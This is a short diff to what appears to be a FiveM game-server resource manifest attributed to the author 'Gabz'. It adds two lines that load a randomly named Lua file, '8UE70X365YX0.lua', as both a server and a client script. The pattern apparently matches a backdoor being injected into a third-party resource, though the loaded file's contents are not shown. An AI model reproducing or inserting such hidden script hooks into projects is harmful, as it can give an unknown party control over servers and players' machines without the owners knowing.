@@ -1,3 +1,5 @@
+server_script "8UE70X365YX0.lua"
+client_script "8UE70X365YX0.lua"
 fx_version 'cerulean'
 game 'gta5'
 author 'Gabz'
